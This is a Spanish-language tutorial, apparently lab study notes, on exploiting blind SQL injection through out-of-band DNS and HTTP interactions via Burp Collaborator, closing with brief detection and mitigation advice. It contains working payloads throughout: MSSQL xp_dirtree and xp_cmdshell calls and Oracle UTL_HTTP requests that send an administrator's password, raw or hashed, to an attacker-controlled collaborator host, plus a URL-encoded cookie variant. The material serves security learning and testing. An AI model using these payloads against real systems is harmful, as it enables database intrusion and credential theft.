# Explotación Blind SQLi mediante técnicas Out‑Of‑Band

---



OAST se refiere a técnicas que provocan **interacciones de red salientes** desde el sistema objetivo hacia un servidor controlado por el atacante (DNS, HTTP, SMB, etc.).

Cuando la app ejecuta la consulta vulnerable en un hilo separado (consulta original en un hilo y consulta de cookie en un nuevo hilo) o su respuesta no depende de la ejecución de esa query, las técnicas tradicionales (ver/errores/tiempos) no funcionan. OAST permite detectar y exfiltrar datos mediante la observación de interacciones externas provocadas por la base de datos vulnerable.

Las interacciones más fiables suelen usar **DNS** porque muchas redes permiten peticiones DNS salientes y los resolvers realizarán la consulta por el atacante (o por un servicio como Burp Collaborator) incluso si otros protocolos están bloqueados.

`Nota`: Resolver es el componente que recibe una consulta DNS y se encarga de resolverla paso a paso hasta obtener la respuesta final. Es el intermediario entre tu sistema y los servidores autoritativos que contienen la información real.

---

## Herramientas útiles

* **Burp Collaborator**: servicio que genera subdominios únicos y registra cualquier interacción DNS/HTTP/SMTP/SMB/etc. Burp Professional integra un cliente que automatiza la comprobación. Ideal para labs y pentests.
[Burp Collaborator doc](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
* **Otras opciones públicas/privadas**: Interactsh, Canarytokens, servicios DNS propios. En pruebas autorizadas puedes correr tu propio servidor DNS y recoger solicitudes.

---

## Flujo general de un ataque OAST

1. **Generás un identificador único** (p. ej. `abc123.attacker.com`) usando Collaborator o tu servidor.
2. **Construís un payload** que haga que la base de datos realice una consulta DNS/HTTP hacia ese host cuando se cumpla una condición o para incorporar datos (exfil).
3. **Envíás la petición** vulnerable (por ejemplo con cookie TrackingId inyectado).
4. **Observás en Collaborator** si llega una petición DNS/HTTP con el subdominio generado; si llega, confirmás que la inyección fue ejecutada y, dependiendo del payload, obtendrás datos (por ejemplo el valor de una columna en el subdominio).

---

## Efectividad

* Las resoluciones DNS a menudo son permitidas en egress.
* Las consultas DNS transportan texto en el nombre de dominio, por lo que puedes meter fragmentos de datos (hex/base32) en el subdominio.
* Un solo evento DNS confirma ejecución remota y puede contener información exfiltrada.

---

## Ejemplos de técnicas por SGBD

### Microsoft SQL Server (T‑SQL)

Funciones/procs que pueden ejecutar acciones que causan consultas DNS/SMB:

* `xp_dirtree`, `xp_subdirs`, `xp_fileexist`, `xp_cmdshell` (si están habilitadas) pueden provocar accesos a rutas UNC que a su vez generan resoluciones DNS/SMB en el lado de un resolver o controlador.

**Ejemplo (xp_dirtree hacia un host controlado por Collaborator):**

```sql
'; exec master..xp_dirtree '//<UNIQUE_ID>.collaborator.net/a'--
```


### Explicación detallada
`exec` - Comando `T-SQL` para ejecutar un procedimiento almacenado o una expresión. En este caso ejecuta el procedimiento extendido `xp_dirtree`.

`master..xp_dirtree`

- `master` — nombre de la base de datos donde existe el procedimiento extendido (en SQL Server los xp_ suelen estar en master).

`..` — sintaxis que indica “usar el esquema por defecto” (es equivalente a `master.dbo.xp_dirtree`).

`xp_dirtree` — procedimiento extendido que lista directorios de una ruta `UNC`. Su efecto: intenta acceder a la ruta de red que le pases, p. ej. `\\host\share`. Ese intento de acceso al host provoca resoluciones `DNS/SMB` desde el entorno víctima hacia el dominio del host.

* El primer `//` indica una ruta UNC; el servicio de resolución intentará resolver `<UNIQUE_ID>.collaborator.net` y esto aparece en Collaborator.
* `xp_cmdshell` también puede usarse para ejecutar `nslookup` o `ping` hacia el dominio si está habilitado (máximo privilegio requerido).

---

**Exfiltración de datos concatenados (ejemplo):**

```sql
'; DECLARE @p varchar(8000); SET @p=(SELECT TOP 1 password FROM users WHERE username='admin'); EXEC('master..xp_dirtree "//'+@p+'.<UNIQUE>.collaborator.net/a"')--
```

Esto coloca la contraseña en el subdominio y desencadena la resolución.

**Notas:** muchos entornos deshabilitan `xp_*` o `xp_cmdshell` por seguridad; funciona cuando están presentes y la DB tiene permisos.

### MySQL

MySQL no tiene procedimientos extendidos de Windows integrados, pero puedes forzar peticiones HTTP/DNS si el servidor tiene UDFs (user defined functions) o si el servidor hace peticiones fuera de banda mediante funciones específicas (raro en entornos administrados).
Una técnica más común es crear una consulta que invoque funciones XML que a su vez contacten hosts (depende de configuración) o usar herramientas intermedias si tienes comandos.

### PostgreSQL

* Postgres no tiene procedimientos equivalentes a `xp_cmdshell` por defecto, pero extensiones (pwned envs) o funciones `COPY TO PROGRAM` (si habilitado) pueden ejecutar comandos.
* Alternativa: usar funciones `dblink` o `postgres_fdw` si están disponibles y apuntarlas a un servidor que provoque un lookup remoto.

### Oracle

* Oracle puede usar `UTL_HTTP.REQUEST` para hacer peticiones HTTP salientes si el DB tiene permisos y la ACL de red lo permite.
* Otra vía es `UTL_INADDR.get_host_address` (dependiendo de versión/configuración), que puede provocar resolución DNS.

**Ejemplo Oracle (conceptual):**

```sql
' || UTL_HTTP.request('http://<UNIQUE>.collaborator.net/') || '
```

### Resumen práctico

* En Windows SQL Server, `xp_dirtree`/`xp_cmdshell` son las opciones más directas para DNS/SMB OAST.
* En Oracle/Postgres/MySQL, a menudo se requiere privilegios/funciones/extensiones para las peticiones OOB; sin ellos, OAST puede no ser viable.

---

## Formas de exfiltrar datos en la interacción OOB

* **Embed en subdominio:** `password.<HEX>.collaborator.net` (codifica/segmenta datos largos).
* **Hashing / encoding:** conviene hex/base32/base64 o URL‑safe para evitar caracteres prohibidos en nombres DNS y para dividir en chunks.
* **Segmentación:** si el dato es largo, envíalo en varios intentos (por ejemplo: `1-<chunk1>.<UNIQUE>...`, `2-<chunk2>...`).

**Ejemplo encadenado (MSSQL):**

```sql
'; DECLARE @p varchar(8000);SET @p=(SELECT TOP 1 password FROM users WHERE username='admin');EXEC('master..xp_dirtree "//'+CONVERT(varchar(200), HASHBYTES('MD5',@p),2)+'.<UNIQUE>.collaborator.net/a"')--
```

Aquí se envía un hash (reduce tamaño y evita caracteres problemáticos).

---

## Idea general

Cerrar la comilla, declarar una variable, asignarle el valor que queremos leer de la BD, y ejecutar dinámicamente un procedimiento extendido (`xp_dirtree`) pasando una ruta UNC cuyo host contiene ese valor; al intentar acceder a esa ruta, la red intenta resolver el nombre de host y la resolución (DNS/SMB) llega a un servidor controlado por el atacante, que así recibe el dato exfiltrado.

---

## Desglose paso a paso

Tomamos el payload y lo explicamos en bloques.

### `';`

* **Cierra** la comilla que la aplicación dejó abierta al insertar tu input (si la app hacía `WHERE id = '<input>'`). Así evitas que la comilla sobrante rompa la sintaxis.
* El `'` cierra la cadena; el `;` separa sentencias T‑SQL.

### `DECLARE @p varchar(1024);`

* Declara una variable local `@p` para almacenar texto (hasta 1024 caracteres). Usamos una variable para poder manipular y luego concatenar el dato en una cadena que pasaremos a `EXEC`.

### `SET @p=(SELECT password FROM users WHERE username='Administrator');`

* La subconsulta lee la **contraseña** del usuario `Administrator` y la asigna a `@p`.
* **IMPORTANTE:** si la subconsulta devuelve más de una fila habrá error; por eso en entornos reales se usa `TOP 1`, `LIMIT`, o `ROWNUM=1` según SGBD.

### `exec('master..xp_dirtree "//'+@p+'.abc123.burpcollaborator.net/a"')`

* `exec(...)` ejecuta dinámicamente una cadena T‑SQL construida en tiempo de ejecución. Aquí la cadena contiene la llamada a `master..xp_dirtree` con una ruta UNC.
* `master..xp_dirtree` es un **procedimiento extendido** que lista directorios en una ruta UNC. Al pasársele `//host/share` o `\\host\share` intenta acceder a ese host.
* La cadena `"//'+@p+'.abc123.burpcollaborator.net/a"` concatena (en tiempo de ejecución) el contenido de `@p` dentro del nombre del host de la ruta UNC: el host resultante será `s3curePwd.abc123.burpcollaborator.net` si `@p = 's3curePwd'`.
* Al intentar acceder a esa ruta, la máquina objetivo **resuelve** `s3curePwd.abc123.burpcollaborator.net` → consulta DNS que queda registrada en el servidor autoritativo (p. ej. Burp Collaborator).

### `--`

* Comentario que descarta el resto de la consulta original y evita que comillas o SQL extra provoquen errores de sintaxis.

---

## Por qué esto *exfiltra* datos

* En vez de devolver la contraseña en la respuesta HTTP, la inyectamos en el **subdominio** de la ruta UNC. El entorno objetivo tiene que resolver ese nombre y, como consecuencia, la resolución DNS sale de la red (egress) y llega al servidor del atacante, donde el dato aparece en el subdominio.
* Es una técnica out‑of‑band (OAST) — muy útil cuando la aplicación no devuelve datos ni errores.

---

## Requisitos y permisos

* `xp_dirtree` y `xp_cmdshell` suelen requerir **permisos elevados** (por ejemplo `sysadmin`). En muchas instalaciones están **deshabilitados** por seguridad.
* La red debe permitir **egress DNS** o que la resolución provoque una petición hacia el dominio controlado por el atacante. Si la red bloquea DNS saliente o usa un resolver que no egress, no funcionará.
* El servidor SQL debe poder realizar la operación de red (algunas políticas de grupo/ACLs lo impiden).

---

## Limitaciones prácticas

* **Longitud de host:** los labels DNS tienen máximo ~63 bytes y el dominio total ~253 bytes, por lo que hay que fragmentar y codificar datos largos.
* **Carácteres inválidos:** contraseñas pueden contener caracteres no válidos en hostnames (espacios, @, /). Es recomendable **codificar/hexificar/base32** el dato antes de usarlo en el host.
* **Detección:** llamadas a `xp_*` y resoluciones extrañas son ruidosas y suelen activan IDS/WAF/logging.
* **Privilegios:** sin privilegios no se puede ejecutar `xp_dirtree` ni `xp_cmdshell` o `EXEC` dinámico.

---

## Cómo adaptar / robustecer (labs)

* **Asegurar una sola fila:** usar `TOP 1` (MSSQL): `SET @p=(SELECT TOP 1 password FROM users WHERE username='Administrator');`
* **Codificar dato:** usar `master..fn_varbintohexstr` o `CONVERT` para hexificar antes de concatenar, o calcular un hash para reducir longitud y caracteres:

  ```sql
  SET @p = (SELECT CONVERT(varchar(200), HASHBYTES('MD5', (SELECT TOP 1 password FROM users WHERE username='Administrator')),2));
  ```
* **Fragmentar:** si el dato es largo, enviar en trozos: `...xp_dirtree '//part1.part2.<UNIQUE>.collab.net/a'` en varias peticiones.

---

## Ejemplo URL‑encoded (para Burp/cookie)

Payload simple (sin exfiltrar valor):

```
'; exec master..xp_dirtree '//abc123.collaborator.net/a'--
```

URL-encoded:

```
%27%3B%20exec%20master..xp_dirtree%20%27%2F%2Fabc123.collaborator.net%2Fa%27--
```

---

## Alternativas y equivalentes

* `xp_fileexist '\\host\share'` — también fuerza resolución.
* `xp_subdirs` — similar a `xp_dirtree`.
* `xp_cmdshell 'nslookup host'` — si está habilitado permite ejecutar `nslookup` (más ruidoso).
* En otros SGBD: Oracle (`UTL_HTTP`, `UTL_INADDR`), PostgreSQL (`COPY TO PROGRAM`, extensiones) permiten OAST si tienen privilegios.



---


---

## Práctica en Burp Collaborator

1. Generá un nuevo payload OAST en Collaborator o usa el cliente integrado en Burp.
2. Inserta el subdominio único en tu payload según SGBD.
3. Envía la petición vulnerable.
4. Pollea Collaborator: si hay una entrada de tipo DNS/HTTP/SMB con tu ID, la inyección fue ejecutada y posiblemente hayas exfiltrado datos.

**Importante:** Collaborator registra peticiones y te muestra la fuente, el tipo y el contenido (cuando aplica).

---

## Limitaciones, detección y contradicciones

* **Privilegios**: muchas técnicas requieren funciones o procedimientos privilegiados (xp_*, utl_http, etc.).
* **Firewalls / egress filtering**: si el entorno bloquea egress DNS o fuerza resolvers internos sin salida, OAST puede fallar.
* **WAF / detección**: patrones UNC `//host/...` o llamadas a `xp_cmdshell` suelen ser detectadas.
* **Tamaño**: los registros DNS limitan la longitud de cada label (~63 bytes) y del dominio total (~253 bytes), por lo que hay que fragmentar datos.
* **Ruido**: muchas resoluciones internas o caching pueden complicar correlación; usar IDs únicos ayuda.

---

## Detección y mitigación

* **Egress filtering**: bloquear/detección de resoluciones DNS no autorizadas y restringir salidas HTTP/SMB.
* **Principle of least privilege**: deshabilitar `xp_cmdshell`, restringir `UTL_HTTP`, evitar extensiones no necesarias.
* **Registro y alerta**: monitorizar patrones inusuales (resoluciones a dominios raros, invocaciones a funciones peligrosas).
* **WAF/IPS tuning**: detectar y bloquear patrones UNC/`xp_*` y payloads con subdominios dinámicos.

---


